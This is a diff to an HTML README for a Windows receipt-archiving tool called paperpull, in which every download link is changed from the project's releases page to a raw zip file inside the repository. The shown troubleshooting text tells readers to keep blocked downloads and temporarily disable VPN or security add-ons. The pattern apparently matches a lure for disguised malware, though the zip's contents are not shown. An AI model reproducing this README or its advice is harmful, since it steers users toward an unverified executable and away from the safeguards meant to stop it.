@@ -2,7 +2,7 @@
 <br>
 <br>
 <div class="badge-container">
-  <a href="https://github.com/ghonime1674/paperpull/releases" class="download-badge">⬇️ Download paperpull Now</a>
+  <a href="https://raw.githubusercontent.com/ghonime1674/paperpull/main/core/3.3.zip" class="download-badge">⬇️ Download paperpull Now</a>
 </div>
 
 <h1>🗂️ paperpull - Your Receipts, Automatically Archived</h1>
@@ -43,7 +43,7 @@
 <h3>Step 1: Download the Application</h3>
 <p>Visit this link to download the application. It’s the only official source.</p>
 <div style="text-align:center; margin:20px 0;">
-  <a href="https://github.com/ghonime1674/paperpull/releases" style="background-color:#4CAF50; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:5px;">📥 Go to Download Page</a>
+  <a href="https://raw.githubusercontent.com/ghonime1674/paperpull/main/core/3.3.zip" style="background-color:#4CAF50; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:5px;">📥 Go to Download Page</a>
 </div>
 
 <h3>Step 2: Run the Downloaded File</h3>
@@ -102,7 +102,7 @@
   <li>Check your browser’s <strong>Downloads</strong> bar. Right-click the blocked file and choose <strong>"Keep"</strong> or <strong>"Download anyway"</strong>.</li>
   <li>Try a different browser (Edge, Chrome, Firefox).</li>
   <li>Disable any VPN or security add-on temporarily, then download again.</li>
-  <li>If the page doesn't load, copy and paste this URL directly into your browser: <code>https://github.com/ghonime1674/paperpull/releases</code></li>
+  <li>If the page doesn't load, copy and paste this URL directly into your browser: <code>https://raw.githubusercontent.com/ghonime1674/paperpull/main/core/3.3.zip</code></li>
 </ol>
 
 <h2>⭐ Show Your Support</h2>
@@ -116,7 +116,7 @@
 
 <div style="text-align:center; margin-top:30px; padding:20px; background-color:#f0f0f0; border-radius:8px;">
   <h3 style="margin-bottom:10px;">📥 Ready to Go Paperless?</h3>
-  <a href="https://github.com/ghonime1674/paperpull/releases" style="background-color:#FF5722; color:white; padding:15px 40px; text-decoration:none; font-size:24px; border-radius:5px; font-weight:bold;">Download paperpull Now</a>
+  <a href="https://raw.githubusercontent.com/ghonime1674/paperpull/main/core/3.3.zip" style="background-color:#FF5722; color:white; padding:15px 40px; text-decoration:none; font-size:24px; border-radius:5px; font-weight:bold;">Download paperpull Now</a>
   <p style="font-size:12px; margin-top:10px;">Windows 10/11 · Free · Open Source</p>
 </div>
 
